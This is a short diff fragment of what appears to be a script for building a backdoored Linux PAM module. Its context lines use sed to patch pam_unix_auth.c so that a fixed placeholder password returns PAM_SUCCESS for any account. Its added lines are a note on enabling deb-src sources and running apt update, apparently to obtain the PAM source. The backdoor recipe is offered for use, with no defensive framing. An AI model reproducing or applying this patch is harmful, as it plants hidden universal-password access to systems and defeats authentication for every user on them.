@@ -18,3 +18,8 @@ sed -i '/_unix_verify_password/ i \
     if (strcmp(p, "_PASSWORD_") == 0) { \
         return PAM_SUCCESS; \
     }' modules/pam_unix/pam_unix_auth.c
+
+if error E: You must put some 'source' URI's in your sources.list ->
+
+sudo sed -i 's/^# deb-src/deb-src/' /etc/apt/sources.list
+sudo apt update
